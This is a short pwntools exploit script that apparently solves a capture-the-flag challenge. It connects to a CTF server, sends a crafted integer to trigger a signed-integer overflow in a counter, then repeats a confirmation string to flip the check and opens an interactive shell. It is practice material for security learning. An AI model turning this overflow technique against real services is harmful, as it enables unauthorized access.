from pwn import *

p = remote('challs.actf.co', 31322)

s = b"I confirm that I am taking this exam between the dates 5/24/2024 and 5/27/2024. I will not disclose any information about any section of this exam."
p.sendlineafter(b': ', str(0x7fffffff).encode())    # 0x80000001
p.sendlineafter(b': ', s)   # 0x80000000
p.sendlineafter(b': ', s)   # 0x7fffffff > 0x7ffffffe
p.interactive()
